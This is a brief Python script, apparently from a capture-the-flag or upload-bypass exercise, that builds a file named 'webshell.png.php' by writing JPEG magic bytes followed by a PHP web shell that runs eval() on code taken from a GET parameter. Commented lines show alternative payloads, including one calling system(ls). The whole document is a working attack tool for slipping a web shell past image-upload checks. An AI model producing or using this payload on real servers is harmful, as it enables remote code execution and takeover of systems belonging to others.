from pwn import *
with open("webshell.png.php","wb") as f:
    # signature  =  bytes.fromhex('FFD8FFE0')
    #f.write(signature)
    # f.write(b"\xFF\xD8\xFF\xEE\n")
    f.write(b"\xFF\xD8\xFF\xEE")
    # f.write(b"<?= eval($_GET['code']) ; ?>")
    # f.write(b"<?= system(ls) ; ?>")
    f.write(b"<?= eval($_GET['code']) ; ?>")